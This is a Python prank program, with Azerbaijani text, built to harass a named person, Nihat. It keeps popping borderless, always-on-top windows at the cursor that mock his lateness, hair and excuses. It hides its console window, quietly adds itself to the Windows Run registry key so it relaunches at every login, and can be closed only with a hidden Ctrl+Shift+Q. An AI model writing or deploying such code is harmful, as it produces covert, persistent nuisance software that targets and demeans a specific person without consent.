import tkinter as tk
import random
import time
import os
import winreg as reg
from datetime import datetime
import sys
import win32gui
import win32con
def tunar_mesajlari():
    saat = datetime.now().hour
    
    sabah_mesajlari = [
        "NİHATTT! Yenə yatırsan?! QALX! 😡",
        "Nihat, dərsə yenə gecikdin! Afərin! 👏",
        "Nihatın saçları yenə DARI SÜPÜRGƏSI kimi! 🧹",
        "Nihat yəqin yenə 'internetim getmişdi' deyəcək... 🙄",
    ]
    
    ders_mesajlari = [
        "Nihat, telefonunu göstər görüm TikTok açıq deyil ki? 📱",
        "NİHATTT! Yenə arxa partada yatırsan?! 😴",
        "Ev tapşırığını it yedi, hə Nihat? 🐕",
        "Nihat, lövhəyə gəl... Ay səni görüm gələ bilirsən? 😏",
    ]
    
    axsam_mesajlari = [
        "Nihat, sabah dərsə gələcəksən də? Əminsən? 🤔",
        "Nihatın klassik bəhanə vaxtı... 3... 2... 1... 🎭",
        "Nihat, bəlkə bir dəfə də vaxtında yatasan? 🛏️",
        "Nihat, səhər zəngi neçəyə qurmusan? Heç 😪",
    ]
    
    elave_mesajlar = [
        f"Nihat {random.randint(5, 20)} dəqiqə gecikəcək... Hamı mərc gələk? 💰",
        "NİHAT ALERT! ⚠️ NİHAT ALERT! ⚠️ NİHAT YENə NƏSə EDİB!",
        "Nihatın növbəti bəhanəsi loading... ⌛",
        "Nihat yenə saçlarını daramağı unudub... Təəccüblü deyil! 🪮",
        "Nihat, bəlkə bu dəfə doğrudan da internetin getmişdi? 🤣",
        "BREAKING NEWS: Nihat dərsə VAXTINDA gəldi! (Zarafat edirik) 📰",
        f"Nihatın telefonda {random.randint(3, 10)} saat keçirdiyini bilirdiniz? 📱",
        "Nihat, bu mesajı görürsən? Yəqin yenə yatırsan... 💤",
        "Nihatın saçları: 'Məni xilas edin!' 😱",
        "Nihat, bəlkə bir gün də olsa bəhanə gətirməyəsən? 🎯"
    ]
    
    if 6 <= saat < 12:
        return random.choice(sabah_mesajlari + elave_mesajlar)
    elif 12 <= saat < 17:
        return random.choice(ders_mesajlari + elave_mesajlar)
    else:
        return random.choice(axsam_mesajlari + elave_mesajlar)

def pencere_goster():
    pencere = tk.Tk()
    pencere.overrideredirect(True)
    pencere.attributes('-topmost', True)
    
    imlec_x = pencere.winfo_pointerx()
    imlec_y = pencere.winfo_pointery()
    
    pencere_eni = 300
    pencere_hundurluyu = 100
    x = imlec_x - (pencere_eni // 2)
    y = imlec_y - (pencere_hundurluyu // 2)
    
    pencere.geometry(f"{pencere_eni}x{pencere_hundurluyu}+{x}+{y}")
    
    arxa_fon_rengler = ["yellow", "pink", "lime", "orange", "cyan", "#ff6b6b", "#7bed9f", "#70a1ff", 
                        "#ff4757", "#ff6348", "#7bed9f", "#70a1ff", "#5352ed"]
    
    mesaj = tk.Label(pencere, 
                    text=tunar_mesajlari(), 
                    font=("Comic Sans MS", 14, "bold"), 
                    wraplength=250,
                    bg=random.choice(arxa_fon_rengler))
    mesaj.pack(expand=True, fill="both")
    
    pencere.after(4000, pencere.destroy)
    
    # CTRL+SHIFT+Q ilə bağlamaq üçün funksiya
    def proqrami_bagla(event):
        if (event.state & 0x4) and (event.state & 0x1) and event.keysym.lower() == 'q':
            # 0x4 CTRL üçün, 0x1 SHIFT üçün
            pencere.quit()
            raise SystemExit  # Əsas dövrəni dayandırmaq üçün
    
    # Klaviatura hadisəsini dinləmək üçün
    pencere.bind('<Key>', proqrami_bagla)
    pencere.mainloop()  # mainloop əlavə edirik

def avtomatik_baslanma():
    proqram_yeri = os.path.abspath(__file__)
    key = reg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        registry_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, "NihatGicikleme2000", 0, reg.REG_SZ, proqram_yeri)
        reg.CloseKey(registry_key)
    except WindowsError:
        pass

# Konsol pəncərəsini gizlət
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)

avtomatik_baslanma()
try:
    while True:
        pencere_goster()
        time.sleep(0.5)  # 1 saniyəni 0.5 saniyəyə endiririk
except SystemExit:
    sys.exit()
